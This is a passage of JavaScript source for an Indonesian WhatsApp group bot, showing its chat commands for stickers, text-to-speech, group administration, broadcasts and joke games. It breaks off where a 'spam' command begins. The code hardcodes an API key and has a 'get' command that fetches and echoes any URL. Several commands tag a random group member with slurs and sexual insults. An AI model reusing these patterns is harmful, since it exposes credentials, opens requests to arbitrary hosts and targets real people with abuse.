                    packname: text.split('|')[0] ? text.split('|')[0] : pushname,
                    author: text.split('|')[1] ? text.split('|')[1] : ''
                })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return reply(lang.NoToStik(prefix, command))
                let media = await quoted.download()
                let encmedia = await fureya.sendVideoAsSticker(m.chat, media, m, {
                    packname: text.split('|')[0] ? text.split('|')[0] : pushname,
                    author: text.split('|')[1] ? text.split('|')[1] : ''
                })
                await fs.unlinkSync(encmedia)
            } else {
                reply('hah')
            }
        }
        break
               
        case 'ssweb': {
              if (!url) throw `Example: ${prefix + command} https://www.google.com`
                  m.reply(mess.wait)
                  ssweb = await getBuffer(`https://api.betabotz.org/api/tools/ssweb?url=${url}&device=desktop&apikey=${ziiii}`)
                  fureya.sendMessage(m.chat, {image: ssweb, mimetype: 'image/png', caption: `Done`}, {quoted:m})
			}
            break

        case "s":
        case "sticker":
        case "stiker": {
            if (!quoted) return reply("reply fto nya");
            if (/image/.test(mime)) {
                let media = await quoted.download();
                let encmedia = await fureya.sendImageAsSticker(m.chat, media, m, {
                    packname: global.packname,
                    author: global.author,
                });
                await fs.unlinkSync(encmedia);
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return reply("bentar kak");
                let media = await quoted.download();
                let encmedia = await fureya.sendVideoAsSticker(m.chat, media, m, {
                    packname: global.packname,
                    author: global.author,
                });
                await fs.unlinkSync(encmedia);
            } else {
                reply("reply yang mau dibikin stiker");
            }
        }
        break;
        
        case 'ttsid': {
         	if (!text) throw `Example : ${prefix + command} text`
         	m.reply(mess.wait)
             let tts = await fetchJson(`https://api.betabotz.org/api/sound/texttosound?text1=${text}&lang=id-ID&apikey=sJsk9y8c`)
             fureya.sendMessage(m.chat, { audio: { url: tts.result }, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
         	}
        break
        
        case 'ttsen': {
            if (!text) throw `Example : ${prefix + command}
            text`
            m.reply(mess.wait)
            let tts = await fetchJson(`https://api.betabotz.org/api/sound/texttosound?text1=${text}&lang=en-US&apikey=${ziiii}`)
            fureya.sendMessage(from, { audio: { url: tts.result }, mimetype: 'audio/mp4', ptt: true }, { quoted: m})
        }
        break
        
        case 'smeme': {
	        let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
	        if (!/image/.test(mime)) return m.reply(respond)
            if (!text) return m.reply(respond)
	        m.reply(mess.wait)
            atas = text.split('|')[0] ? text.split('|')[0] : '-'
            bawah = text.split('|')[1] ? text.split('|')[1] : '-'
	        let dwnld = await fureya.downloadAndSaveMediaMessage(quoted)
	        let fureyaCans = await TelegraPh(dwnld)
	        let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fureyaCans}`
	        let Fauzi = await fureya.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.auhor })
	        await fs.unlinkSync(Fauzi)
            }
	    break
        
        case 'linkgroup':
            case 'linkgrup':
            case 'linkgc': {
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                let response = await fureya.groupInviteCode(m.chat)
                fureya.sendText(m.chat, `👥 *INFO LINK GROUP*\n📛 *Nama :* ${groupMetadata.subject}\n👤 *Owner Grup :* ${groupMetadata.owner !== undefined ? '@' + groupMetadata.owner.split`@`[0] : 'Tidak diketahui'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Link Chat :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m,  {
                    detectLink: true
                })
            }
            break
            
        case 'get': {
       	if (!url) throw `Example: ${prefix + command} url`
       	m.reply(mess.wait)
       	let gt = await getBuffer(`${url}`)
       	let gett = `${gt}`
       	m.reply(`${gett}`)
        }
        break

        case 'welcome':
            if (!m.isGroup) return reply(mess.group)
            if (!isAdmins && !isCreator) return reply(mess.admin)
            if (args[0] === "on") {
                if (isWelcome) return reply(mess.done)
                _welcome.push(m.chat)
                fs.writeFileSync('./database/welcome.json', JSON.stringify(_welcome, null, 2))
                reply(mess.done)
            } else if (args[0] === "off") {
                if (!isWelcome) return reply(mess.done)
                let anu = _welcome.indexOf(m.chat)
                _welcome.splice(anu, 1)
                fs.writeFileSync('./database/welcome.json', JSON.stringify(_welcome, null, 2))
                reply('udh off')
            } else {
                fureya.sendButMessage(from, 'Mode Welcome Msg', `© ${namaowner}`, [{
                    buttonId: '.welcome on',
                    buttonText: {
                        displayText: 'ON'
                    },
                    type: 1
                }, {
                    buttonId: '.welcome off',
                    buttonText: {
                        displayText: 'OFF'
                    },
                    type: 1
                }], {
                    quoted: m
                })
            }
            break
            
            
            
        case 'goodbye':
        case 'left':
            if (!m.isGroup) return reply(mess.group)
            if (!isAdmins && !isCreator) return reply(mess.admin)
            if (args[0] === "on") {
                if (isLeft) return reply(mess.done)
                _left.push(m.chat)
                fs.writeFileSync('./database/left.json', JSON.stringify(_left, null, 2))
                reply('udah on kak')
            } else if (args[0] === "off") {
                if (!isLeft) return reply(mess.done('mematikan goodbye'))
                let anu = _left.indexOf(m.chat)
                _left.splice(anu, 1)
                fs.writeFileSync('./database/welcome.json', JSON.stringify(_left, null, 2))
                reply('udah off')
            } else {

                fureya.sendButMessage(from, 'Mode Goodbye Msg', `© ${namaowner}`, [{
                    buttonId: '.left on',
                    buttonText: {
                        displayText: 'ON'
                    },
                    type: 1
                }, {
                    buttonId: '.left off',
                    buttonText: {
                        displayText: 'OFF'
                    },
                    type: 1
                }], {
                    quoted: m
                })
            }
            break

        case "antiwame": {
            if (!m.isGroup) return reply("Fitur Khusus Group!");
            if (!isAdmins) return reply("Fitur Khusus admin!");
            if (!isBotAdmins)
                return reply("Jadikan bot sebagai admin terlebih dahulu");
            if (args[0] === "on") {
                if (isAntiWame) return reply(`Udah aktif`);
                antiwame.push(m.chat);
                fs.writeFileSync(
                    "./database/antiwame.json",
                    JSON.stringify(antiwame, null, 2)
                );
                reply("Successfully Activate Antiwame In This Group");
            } else if (args[0] === "off") {
                if (!isAntiWame) return reply(`Udah nonaktif`);
                let anu = antiwame.indexOf(m.chat);
                antiwame.splice(anu, 1);
                fs.writeFileSync(
                    "./database/antiwame.json",
                    JSON.stringify(antiwame, null, 2)
                );
                reply("Successfully Disabling Antiwame In This Group");
            } else {
                reply(
                    `Kirim perintah ${prefix + command} on/off\n\nContoh: ${
                prefix + command
              } on`
                );
            }
        }
        break;
        case "antiwame2": {
            if (!m.isGroup) return reply("Fitur Khusus Group!");
            if (!isAdmins) return reply("Fitur Khusus admin!");
            if (!isBotAdmins)
                return reply("Jadikan bot sebagai admin terlebih dahulu");
            if (args[0] === "on") {
                if (isAntiWame2) return reply(`Udah aktif`);
                antiwame2.push(m.chat);
                fs.writeFileSync(
                    "./database/antiwame2.json",
                    JSON.stringify(antiwame2, null, 2)
                );
                reply("Successfully Activate antiwame2 In This Group");
            } else if (args[0] === "off") {
                if (!isAntiWame2) return reply(`Udah nonaktif`);
                let anu = antiwame2.indexOf(m.chat);
                antiwame2.splice(anu, 1);
                fs.writeFileSync(
                    "./database/antiwame2.json",
                    JSON.stringify(antiwame2, null, 2)
                );
                reply("Successfully Disabling antiwame2 In This Group");
            } else {
                reply(
                    `Kirim perintah ${prefix + command} on/off\n\nContoh: ${
                prefix + command
              } on`
                );
            }
        }
        break;
        
        case 'group':
            case 'grup': {
                if (!m.isGroup) return m.reply(mess.group)
                if (!isAdmins && !isCreator) return m.reply(mess.admin)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (args[0] === 'close') {
                    await fureya.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Sukses Menutup Group 🕊️`)).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'open') {
                    await fureya.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group 🕊️`)).catch((err) => m.reply(jsonformat(err)))
                } else {
                  m.reply(`Mode ${command}\n\n\nKetik ${prefix + command} open/close`)
                }
            }
            break
        
        case "open":
        case "buka": {
            if (!m.isGroup) return reply("Fitur Khusus Group!");
            if (!isAdmins) return reply("Fitur Khusus admin!");
            if (!isBotAdmins) return reply("Bot bukan admin");
            fureya.groupSettingUpdate(m.chat, "not_announcement");
            const textOpen = await getTextSetOpen(m.chat, set_open);
            reply(
                textOpen ||
                `Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`
            );
        }
        break;
        case "antilink": {
            if (!m.isGroup) return reply("Fitur Khusus Group!");
            if (!isAdmins) return reply("Fitur Khusus admin!");
            if (!isBotAdmins) return reply("Bot harus menjadi admin");
            if (args[0] === "on") {
                if (isAntiLink) return reply(`Udah aktif`);
                antilink.push(m.chat);
                fs.writeFileSync(
                    "./database/antilink.json",
                    JSON.stringify(antilink, null, 2)
                );
                reply("Successfully Activate Antilink In This Group");
            } else if (args[0] === "off") {
                if (!isAntiLink) return reply(`Udah nonaktif`);
                let anu = antilink.indexOf(m.chat);
                antilink.splice(anu, 1);
                fs.writeFileSync(
                    "./database/antilink.json",
                    JSON.stringify(antilink, null, 2)
                );
                reply("Successfully Disabling Antilink In This Group");
            } else {
                reply(
                    `Kirim perintah ${prefix + command} on/off\n\nContoh: ${
              prefix + command
            } on`
                );
            }
        }

        case "antilink2": {
            if (!m.isGroup) return reply("Fitur Khusus Group!");
            if (!isAdmins) return reply("Fitur Khusus admin!");
            if (!isBotAdmins) return reply("Bot harus menjadi admin");
            if (args[0] === "on") {
                if (isAntiLink2) return reply(`Udah aktif`);
                antilink2.push(m.chat);
                fs.writeFileSync(
                    "./database/antilink2.json",
                    JSON.stringify(antilink2, null, 2)
                );
                reply("Successfully Activate antilink2 In This Group");
            } else if (args[0] === "off") {
                if (!isAntiLink2) return reply(`Udah nonaktif`);
                let anu = antilink2.indexOf(m.chat);
                antilink2.splice(anu, 1);
                fs.writeFileSync(
                    "./database/antilink2.json",
                    JSON.stringify(antilink2, null, 2)
                );
                reply("Successfully Disabling antilink2 In This Group");
            } else {
                reply(
                    `Kirim perintah ${prefix + command} on/off\n\nContoh: ${
                prefix + command
              } on`
                );
            }
        }
        break;

        case "close":
        case "tutup": {
            if (!m.isGroup) return reply("Fitur Khusus Group!");
            if (!isAdmins) return reply("Fitur Khusus admin!");
            if (!isBotAdmins) return reply("Bot bukan admin");
            fureya.groupSettingUpdate(m.chat, "announcement");
            const textClose = await getTextSetClose(m.chat, set_close);
            reply(
                textClose ||
                `Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`
            );
        }
        break;
        case "h":
        case "hidetag": {
            if (!m.isGroup) return reply("Khusus grup");
            if (!(isAdmins || isCreator)) return reply("Fitur khusus admin");
            let tek = m.quoted ? quoted.text : text ? text : "";
            fureya.sendMessage(
                m.chat, {
                    text: tek,
                    mentions: participants.map((a) => a.id),
                }, {}
            );
        }
        break;

        case "tagall":
        case "infoall":
            if (!m.isGroup) return reply("fitur khusus gc");
            if (!(isAdmins || isCreator))
                return reply("eitsss cumaaa admin yang bisa pake fitur ini");
            let tekss = `══ • *Mention All* • ══\n\n• *Message : ${
          q ? q : "kosong"
        }*\n\n`;
            for (let mem of participants) {
                tekss += `> @${mem.id.split("@")[0]}\n`;
            }
            tekss += `\n>>>>> *FureyaBot* <<<<<`;
            fureya.sendMessage(
                m.chat, {
                    text: tekss,
                    mentions: participants.map((a) => a.id),
                }, {
                    quoted: m,
                }
            );
            break;

        case 'totag': {
            if (!m.isGroup) return reply(mess.group)
            if (!isBotAdmins) return reply(mess.botAdmins)
            if (!isAdmins) return reply('khusus atmin')
            if (!m.quoted) return `Reply pesan dengan caption ${prefix + command}`
            fureya.sendMessage(m.chat, {
                forward: m.quoted.fakeObj,
                mentions: participants.map(a => a.id)
            })
        }
        break

        case 'kick': {
                if (!isCreator) return reply(mess.owner)
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await fureya.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(mess.done)).catch((err) => reply('error'))
            }
            break
            case 'add': {
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await fureya.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(mess.done)).catch((err) => reply("erorr"))
            }
            break

        case "demote": {
            if (!m.isGroup) return reply("fitur khusus group");
            if (!isCreator) return reply("fitur khusus ownerkuu");
            if (!(isAdmins || isBotAdmins)) return reply("fitur khusus atmin");
            if (!m.quoted && !text) return reply("reply org nya dong");
            let users = m.mentionedJid[0] ?
                m.mentionedJid[0] :
                m.quoted ?
                m.quoted.sender :
                text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
            await fureya
                .groupParticipantsUpdate(m.chat, [users], "demote")
                .then((res) => reply("awokawok kasian kena demote"))
                .catch((err) => reply(lang.err()));
        }
        break;
        case "revoke":
            if (!m.isGroup) return reply("fitur khusus grup");
            if (!isCreator) return reply("khusus owner");
            if (!(isAdmins || isBotAdmins)) return reply("khusus atmin");
            let link = await fureya.groupRevokeInvite(from);
            await reply(
                "dahhh" +
                `\n\n*New Link for ${groupName}* :\n https://chat.whatsapp.com/${link}`
            );
            break;


        case 'apakah': {
            if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
            const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
            const kah = apa[Math.floor(Math.random() * apa.length)]
            reply(`Pertanyaan : Apakah ${q}\nJawaban : ${kah}`)
        }
        break
        case 'bisakah': {
            if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya ngent`)
            const bisa = ['Bisa', 'Gak Bisa', 'Gak Bisa Ajg Aaokawpk', 'TENTU PASTI KAMU BISA!!!!']
            const ga = bisa[Math.floor(Math.random() * bisa.length)]
            reply(`Pertanyaan : Apakah ${q}\nJawaban : ${ga}`)
        }
        break

        case 'nikahin': {
            if (!q) return reply(`penggunaan ${command} text\n\nContoh : ${command} fauzi`)
            const bisa = ['Bisa', 'Gabisa', 'gabisa ajg awoakwok', 'WEDEHH TENTUU BISAAA']
            const ga = bisa[Math.floor(Math.random() * bisa.length)]
            reply(`Pertanyaan : Nikahin ${q}\nJawaban : ${ga}`)
        }
        break
        case 'bagaimanakah': {
            if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
            const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel', 'astaghfirallah Beneran???', 'Pusing ah', 'Owhh Begitu:(', 'Yang Sabar Ya Bos:(', 'Gimana yeee']
            const ya = gimana[Math.floor(Math.random() * gimana.length)]
            reply(`Pertanyaan : Apakah ${q}\nJawaban : ${ya}`)
        }
        break
        case 'rate': {
            if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
            const ra = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
            const te = ra[Math.floor(Math.random() * ra.length)]
            reply(`Rate : ${q}\nJawaban : *${te}%*`)
        }
        break

        case 'gantengcek':
        case 'cekganteng': {
            if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Owner`)
            const gan = ['10% banyak" perawatan ya bang:v\nCanda Perawatan:v', '30% Semangat bang Merawat Dirinya><', '20% Semangat Ya bang👍', '40% Wahh bang><', '50% abang Ganteng deh><', '60% Hai Ganteng🐊', '70% Hai Ganteng🐊', '62% Bang Ganteng><', '74% abang ni ganteng deh><', '83% Love You abang><', '97% Assalamualaikum Ganteng🐊', '100% Bang Pake Susuk ya??:v', '29% Semangat Bang:)', '94% Hai Ganteng><', '75% Hai Bang Ganteng', '82% wihh abang Pasti Sering Perawatan kan??', '41% Semangat:)', '39% Lebih Semangat🐊']
            const teng = gan[Math.floor(Math.random() * gan.length)]
            reply(`Nama : ${q}\nJawaban : *${teng}%*`)
        }
        break

        case 'cantikcek':
        case 'cekcantik': {
            if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Akame`)
            const can = ['10% banyak" perawatan ya kak:v\nCanda Perawatan:v', '30% Semangat Kaka Merawat Dirinya><', '20% Semangat Ya Kaka👍', '40% Wahh Kaka><', '50% kaka cantik deh><', '60% Hai Cantik🐊', '70% Hai Ukhty🐊', '62% Kakak Cantik><', '74% Kakak ni cantik deh><', '83% Love You Kakak><', '97% Assalamualaikum Ukhty🐊', '100% Kakak Pake Susuk ya??:v', '29% Semangat Kakak:)', '94% Hai Cantik><', '75% Hai Kakak Cantik', '82% wihh Kakak Pasti Sering Perawatan kan??', '41% Semangat:)', '39% Lebih Semangat🐊']
            const tik = can[Math.floor(Math.random() * can.length)]
            reply(`Nama : ${q}\nJawaban : *${tik}%*`)
        }
        break

        case 'sangecek':
        case 'ceksange':
        case 'gaycek':
        case 'cekgay':
        case 'lesbicek':
        case 'ceklesbi': {
            if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ${pushname}`)
            const sangeh = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
            const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
            reply(`Nama : ${q}\nJawaban : *${sange}%*`)
        }
        break

        case 'kapankah': {
            if (!q) return reply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
            const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', '30 Hari Lagi', '35 Hari Lagi', '40 Hari Lagi', '45 Hari Lagi', '50 Hari Lagi', '55 Hari Lagi', '60 Hari Lagi', '65 Hari Lagi', '70 Hari Lagi', '75 Hari Lagi', '80 Hari Lagi', '85 Hari Lagi', '90 Hari Lagi', '95 Hari Lagi', '100 Hari Lagi', '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi', '35 Bulan Lagi', '40 Bulan Lagi', '45 Bulan Lagi', '50 Bulan Lagi', '55 Bulan Lagi', '60 Bulan Lagi', '65 Bulan Lagi', '70 Bulan Lagi', '75 Bulan Lagi', '80 Bulan Lagi', '85 Bulan Lagi', '90 Bulan Lagi', '95 Bulan Lagi', '100 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', 'Besok', 'Lusa', `Abis Command Ini Juga Lu ${q}`]
            const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
            reply(`Pertanyaan : ${q}\nJawaban : *${kapankah}*`)
        }
        break
        case 'cekmati': {
            if (!q) return reply(`Invalid!\n\nYg mau di cek siapa kontol?`)
            predea = await axios.get(`https://api.agify.io/?name=${q}`)
            reply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
        }
        break
        
        case "nextgrad": {
            const siapa = ['freya', 'gita', 'christy', 'marsha', 'feni', 'gracia', 'ashel', 'adel', 'eli', 'oniel', 'zee', 'olla', 'fiony', 'jessi', 'flora', 'katrhin', 'muthe', 'lulu']
            const kapan = ['100 Hari Lagi', '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi', '35 Bulan Lagi', '40 Bulan Lagi', '45 Bulan Lagi', '50 Bulan Lagi', '55 Bulan Lagi', '60 Bulan Lagi', '65 Bulan Lagi', '70 Bulan Lagi', '75 Bulan Lagi', '80 Bulan Lagi', '85 Bulan Lagi', '90 Bulan Lagi', '95 Bulan Lagi', '100 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', 'Besok', 'Lusa']
            const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
            const siapakah = siapa[Math.floor(Math.random() * siapa.length)]
            let grad = `*${siapakah}* bakal grad *${kapankah}*`
            fureya.sendMessage(from, { text: grad}, { quoted: m })
        }
        break
        
        case 'halah':
            case 'hilih':
            case 'huluh':
            case 'heleh':
            case 'holoh': {
                if (!m.quoted && !text) return reply(`Kirim/reply text dengan caption ${prefix + command}`)
                ter = command[1].toLowerCase()
                tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
                reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
                }
            break



        case 'ngaceng':
        case 'silit':
        case 'bodoh':
        case 'lesby':
        case 'playboy':
        case 'playgirl':
        case 'monyet':
        case 'mastah':
        case 'newbie':
        case 'bangke':
        case 'sange':
        case 'sangean':
        case 'wibu':
        case 'kontol':
        case 'jomblo':
        case 'slebew':
        case 'kentut':
        case 'bencong':
        case 'ngakak':
        case 'nganggur':
        case 'pantek': {
            if (!m.isGroup) return reply(mess.group)
            let member = groupMembers.map(u => u.id)
            let org = member[Math.floor(Math.random() * member.length)]
            fureya.sendMessage(from, {
                text: `Yang  *${command}* di sini Adalah @${org.split("@")[0]}\n`,
                mentions: [org]
            }, {
                quoted: m
            })
        }
        break


        case "jadian": {
            if (!m.isGroup) return reply(mess.group)
            let member = groupMembers.map(u => u.id)
            let org = member[Math.floor(Math.random() * member.length)]
            fureya.sendMessage(from, {
                text: `ailopyuu @${org.split("@")[0]} kamu mau tidak jadi pacar akuu🥺`,
                mentions: [org]
            }, {
                quoted: m
            })
        }
        break

        case "jodohku": {
            if (!m.isGroup) return reply(mess.group)
            let member = groupMembers.map(u => u.id)
            let org = member[Math.floor(Math.random() * member.length)]
            fureya.sendMessage(from, {
                text: `jodoh kamu adalah @${org.split("@")[0]}\n`,
                mentions: [org]
            }, {
                quoted: m
            })
        }
        break


        case '🗿':
        case '🗿🗿': {
            fureya.sendMessage(from, {
                text: `🗿`
            })
        }
        break
        
     
        
        case 'lirik': {
			if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
			reply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/lirik?apikey=${apikey}&query=${args.length[0]}`)
			reply(data.result)
			}
			break
			
		case 'liriklagu': {
            let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : ''
           if (!teks) throw `✳️ Masukkan judul lagu`
           try {
         let res = await fg.lyrics(text);
         let mes = `▢ *${res.title}*
        ▢ *${res.artist}*
        
        ▢ ${res.lyrics}`;
            fureya.sendFile(m.chat, res.thumb, 'img.png', mes, m);
        } catch (e) {
        	m.reply('*ERROR*')
        } 
        
        }
		
		break
            
            case 'toimage': 
            case 'toimg': {
                if (!/webp/.test(mime)) return reply(`Reply sticker dengan caption *${prefix + command}*`)
                reply(mess.wait)
                let media = await fureya.downloadAndSaveMediaMessage(quoted)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    fureya.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
                
            }
            break
        
        case 'nuliskiri': {
            if (text.length < 2) return reply(`Kirim perintah:\n${prefix+command} teks\n\nContoh penggunaan\n${prefix+command} ini tulisan saya`)
            reply(mess.wait)
            const tulisan = text
            let res = await fetch(global.api("fauzi", '/api/canvas/' + command, {
                text: tulisan
            }, 'apikey'))
            if (!res.ok) throw await res.text()
            let img = await res.buffer()
            fureya.sendFile(m.chat, img, 'nulis.jpg', mess.done, m)
        }
        break

        case 'self': {
            if (!m.key.fromMe && !isCreator) return reply('khusus owner')
            fureya.public = false
            m.reply('Self Mode Activate')
        }
        break

        case 'public': {
            if (!m.key.fromMe && !isCreator) return
            reply('khusus owner')
            fureya.public = true
            m.reply('Public Mode Activate')
        }
        break;


        case 'addprem':
            if (!isCreator) return reply(mess.owner)
            if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
            prrkek = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
            let ceknya = await fureya.onWhatsApp(prrkek)
            if (ceknya.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
            prem.push(prrkek)
            fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
            reply(`The Number ${prrkek} Has Been Premium!`)
            break
        case 'delprem':
            if (!isCreator) return reply(mess.owner)
            if (!args[0]) return reply(`Use ${prefix+command} nomor\nExample ${prefix+command} 916909137213`)
            ya = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
            unp = prem.indexOf(ya)
            prem.splice(unp, 1)
            fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
            reply(`The Number ${ya} Has Been Removed Premium!`)
            break

        case 'bcgc':
        case 'bcgroup': {
            if (!isCreator) return reply(mess.owner)
            if (!q) return reply(`Text mana?\n\nContoh : ${prefix + command} Akame ><`)
            let getGroups = await fureya.groupFetchAllParticipating()
            let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
            let anu = groups.map(v => v.id)
            reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
            for (let i of anu) {
                await sleep(1500)
                let txt = `「 Broadcast Bot 」\n\n${q}`
                reply(txt)
            }
            reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
        }
        break
        case 'bc':
        case 'broadcast':
        case 'bcall': {
            if (!isCreator) return reply(mess.owner)
            if (!q) return reply(`Text mana?\n\nContoh : ${prefix + command} Akame ><`)
            let anu = await store.chats.all().map(v => v.id)
            reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
            for (let yoi of anu) {
                await sleep(1500)
                let txt = `「 Broadcast Bot 」\n\n${q}`
                reply(txt)
            }
            reply('Sukses Broadcast')
        }
        break
        case 'join': {
            if (!isCreator) return reply(mess.owner)
            if (!text) return reply('Masukkan Link Group!')
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return 'Link Invalid!'
            reply(mess.wait)
            let result = args[0].split('https://chat.whatsapp.com/')[1]
            await fureya.groupAcceptInvite(result).then((res) => reply(mess.done)).catch((err) => reply(jsonformat(err)))
        }
        break

        case 'leave': {
            if (!isCreator) return reply(mess.owner)
            await fureya.groupLeave(m.chat).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
        }
        break
        
        case 'addvn':{
            if (!isCreator) return reply(mess.owner)
            if (args.length < 1) return reply('Nama audionya apa')
            if (vnnya.includes(q)) return reply("Nama tersebut sudah di gunakan")
            let delb = await fureya.downloadAndSaveMediaMessage(quoted)
            vnnya.push(q)
            await fsx.copy(delb, `./database/AUDIO/${q}.mp3`)
            fs.writeFileSync('./database/vnnya.json', JSON.stringify(vnnya))
            fs.unlinkSync(delb)
            reply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
        }
        break
        case 'delvn':{
            if (!isCreator) return reply(mess.owner)
            if (args.length < 1) return reply('Masukan query')
            if (!vnnya.includes(q)) return reply("Nama tersebut tidak ada di dalam data base")
            let wanu = vnnya.indexOf(q)
            vnnya.splice(wanu, 1)
            fs.writeFileSync('./database/vnnya.json', JSON.stringify(vnnya))
            fs.unlinkSync(`./database/AUDIO/${q}.mp3`)
            reply(`Sukses delete vn ${q}`)
        }
        break
        
        case 'listvn':{
            let teksooo = '┌──⭓「 *LIST VN* 」\n│\n'
            for (let x of vnnya) {
            teksooo += `│⭔ ${x}\n`
            }
            teksooo += `│\n└────────────⭓\n\n*Total ada : ${vnnya.length}*`
            reply(teksooo)
        }
        break
        
        case 'listpc': {
                if (!isCreator) return reply(mess.owner)
                let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                let tekslist = `*🔒 LIST PERSONAL CHAT*\n\n`
                tekslist += `*📱 Total Chat :* ${anu.length} Chat\n\n`
                for (let i of anu) {
                    let nama = store.messages[i].array[0].pushName
                    tekslist += `📛 *Nama :* ${nama}\n`
                    tekslist += `👤 *User :* @${i.split('@')[0]}\n`
                    tekslist += `🔗 *Link Chat :* https://wa.me/${i.split('@')[0]}\n\n`
                    tekslist += `──────────────────────\n\n`
                }
                reply(tekslist)
            }
        break
        
        case 'listgc': {
                if (!isCreator) return reply(mess.owner)
                let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                let tekslistgc = `👥 *LIST GROUP CHAT*\n\n`
                tekslistgc += `📱 Total Group : ${anu.length} Group\n\n`
                for (let e of anu) {
                    let metadata = await fureya.groupMetadata(e)
                    tekslistgc += `📛 *Nama :* ${metadata.subject}\n`
                    tekslistgc += `👤 *Owner Grup :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n`
                    tekslistgc += `🌱 *ID :* ${metadata.id}\n`
                    tekslistgc += `⏳ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n`
                    tekslistgc += `👥 *Member :* ${metadata.participants.length}\n\n`
                    tekslistgc += `──────────────────────\n\n`
                }
                reply(tekslistgc)
            }
        break
        
        case "spamgc": case "spam": case "gcwakwaw": {
